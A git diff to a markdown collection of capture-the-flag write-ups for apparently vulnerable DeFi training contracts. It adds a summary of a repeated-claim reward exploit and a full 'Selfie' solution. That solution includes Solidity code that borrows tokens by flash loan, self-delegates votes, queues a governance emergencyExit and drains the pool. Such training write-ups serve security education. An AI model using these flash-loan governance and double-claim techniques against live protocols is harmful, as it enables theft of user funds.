@@ -7,6 +7,7 @@
 - [03 Truster](#03-truster)
 - [04 Side Entrance](#04-side-entrance)
 - [05 The Rewarder](#05-the-rewarder)
+- [06 Selfie](#06-selfie)
 - [Template](#template)
 
 <!-- /MarkdownTOC -->
@@ -344,6 +345,16 @@ contract Attacker {
 
 ### Solution
 
+#### Summary
+
+1. Test `claimRewards()` with a single claim. For example, `DVT`.
+2. Test `claimRewards()` with two different tokens. For example `DVT` and `WETH`.
+3. Test `claimRewards()` twice with the same token. For example `DVT` and `DVT`.
+4. Notice how the logic of the function didn't close the claim until the last iteration.
+5. Profit.
+
+#### Long Form
+
 If we call `claimRewards()` with a single claim, such as to `DVT`, the control is activated, closing the claim to prevent re-issuance.
 
 ```solidity
@@ -362,7 +373,7 @@ function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) e
 }
 ```
 
-Now, when we call `claimRewards()` with two claims with different tokens, like `DVT` and then `WETH`, ...
+Now, when we call `claimRewards()` with two claims with different tokens, like `DVT` and then `WETH`.
 
 
 ```solidity
@@ -470,6 +481,67 @@ function test_theRewarder() public checkSolvedByPlayer {
 }
 ```
 
+## 06 Selfie
+
+### Challenge
+
+> A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
+>
+> What could go wrong, right?
+>
+> You start with no DVT tokens in balance, and the pool has 1.5 million at risk.
+>
+> Rescue all funds from the pool and deposit them into the designated recovery account.
+
+### Solution
+
+All the funds from the pool can be obtained by calling `emergencyExit()` from the governance contract.
+
+```solidity
+function emergencyExit(address receiver) external onlyGovernance {
+    uint256 amount = token.balanceOf(address(this));
+    token.transfer(receiver, amount);
+
+    emit EmergencyExit(receiver, amount);
+}
+```
+
+To be able to enqueue this function in the contract, we need to have votes. We can borrow the tokens from the pool. Now, in `ERC20Votes`, if we want to participate in the voting procedure, we need to either have votes delegated to us, or we can delegate the votes to ourselves.
+
+```solidity
+function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
+    external
+    returns (bytes32)
+{
+    // We have to delegate to ourselves if we want to participate
+    // in the voting procedure
+    token.delegate(address(this));
+
+    // Enqueue the withdrawal
+    bytes memory data = abi.encodeWithSelector(pool.emergencyExit.selector, address(this));
+    actionId = governance.queueAction(address(pool), 0, data);
+
+    // Approve to give the money back
+    token.approve(address(pool), amount);
+
+    // Comply with the interface
+    return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
+```
+
+Finally, we need to wait 2 days to be able to execute the call, and then transfer the tokens to the recovery account.
+
+```solidity
+// Move 2 seconds in the future
+vm.warp(block.timestamp + 2 days);
+
+// Execute the enqueue call
+governance.executeAction(actionId);
+
+// Send the funds to the recovery accound
+token.transfer(recovery, token.balanceOf(address(this)));
+```
+
 --------------------------------------------------------------------------------
 ## Template
 
@@ -478,9 +550,5 @@ function test_theRewarder() public checkSolvedByPlayer {
 >
 
 ### Solution
-
-* ???
-
-### References
 
 * ???
